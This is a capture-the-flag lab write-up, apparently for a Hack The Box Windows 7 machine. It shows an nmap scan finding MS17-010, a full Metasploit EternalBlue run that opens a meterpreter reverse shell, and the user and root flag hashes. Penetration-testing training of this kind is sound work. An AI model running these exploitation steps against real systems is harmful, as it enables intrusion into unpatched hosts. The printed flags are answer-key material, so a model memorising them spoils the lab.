# Summary
### 1. NMAP
Typical NMAP scan, and already finding a obvious vulnerability.

### 2. Metasploit
We run the EternalBlue module to gain access into the system.

### 3. Getting Flags
Simply finding flags within the system.

# Attack
## 1. NMAP
As usual, we do our first NMAP scan to get an idea of the environment we're attacking.
```
hippoeug@kali:~$ nmap --script vuln 10.129.124.123 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 19:47 +08
...
Scanning 10.129.124.123 [1000 ports]
Discovered open port 445/tcp on 10.129.124.123
Discovered open port 135/tcp on 10.129.124.123
Discovered open port 139/tcp on 10.129.124.123
Discovered open port 49155/tcp on 10.129.124.123
Discovered open port 49157/tcp on 10.129.124.123
Discovered open port 49154/tcp on 10.129.124.123
Discovered open port 49153/tcp on 10.129.124.123
Discovered open port 49156/tcp on 10.129.124.123
...
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

NSE: Script Post-scanning.
Initiating NSE at 19:49
Completed NSE at 19:49, 0.00s elapsed
Initiating NSE at 19:49
Completed NSE at 19:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.62 seconds
```
Ah, Windows 7 SP1, unpatched and vulnerable! Fantastica, it is vulnerable to ms17-010, EternalBlue.

## 2. Metasploit
Let's launch metasploit and attack using EternalBlue.
```
hippoeug@kali:~$ msfconsole
...
msf6 > search eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce
```
Cool, let's use `exploit/windows/smb/ms17_010_eternalblue`!
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
...
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.129.97.134
rhosts => 10.129.97.134
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] 10.129.97.134:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.97.134:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.97.134:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.129.97.134:445 - Connecting to target for exploitation.
[+] 10.129.97.134:445 - Connection established for exploitation.
[+] 10.129.97.134:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.97.134:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.97.134:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.97.134:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.97.134:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.97.134:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.97.134:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.97.134:445 - Sending all but last fragment of exploit packet
[*] 10.129.97.134:445 - Starting non-paged pool grooming
[+] 10.129.97.134:445 - Sending SMBv2 buffers
[+] 10.129.97.134:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.97.134:445 - Sending final SMBv2 buffers.
[*] 10.129.97.134:445 - Sending last fragment of exploit packet!
[*] 10.129.97.134:445 - Receiving response from exploit packet
[+] 10.129.97.134:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.97.134:445 - Sending egg to corrupted connection.
[*] 10.129.97.134:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.129.97.134
[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.129.97.134:49158) at 2021-04-26 23:34:43 +0800
[+] 10.129.97.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.97.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.97.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > pwd
C:\Windows\system32
meterpreter > 
```
Oh yeah! We got into it successfully!

## 3. Getting Flags
Time to find flags. They're usually in the Desktop of the user.
```
meterpreter > ls
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-07-21 14:56:23 +0800  Administrator
40777/rwxrwxrwx   0     dir   2009-07-14 13:08:56 +0800  All Users
40555/r-xr-xr-x   8192  dir   2009-07-14 11:20:08 +0800  Default
40777/rwxrwxrwx   0     dir   2009-07-14 13:08:56 +0800  Default User
40555/r-xr-xr-x   4096  dir   2009-07-14 11:20:08 +0800  Public
100666/rw-rw-rw-  174   fil   2009-07-14 12:54:24 +0800  desktop.ini
40777/rwxrwxrwx   8192  dir   2017-07-14 21:45:33 +0800  haris
...
meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\haris\Desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-14 21:45:52 +0800  desktop.ini
100666/rw-rw-rw-  32    fil   2017-07-21 14:54:02 +0800  user.txt

meterpreter > cat user.txt
4c546aea7dbee75cbd71de245c8deea9
...
meterpreter > cd Administrator/Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-21 14:56:36 +0800  desktop.ini
100444/r--r--r--  32    fil   2017-07-21 14:56:49 +0800  root.txt

meterpreter > cat root.txt
ff548eb71e920ff6c08843ce9df4e717 
```
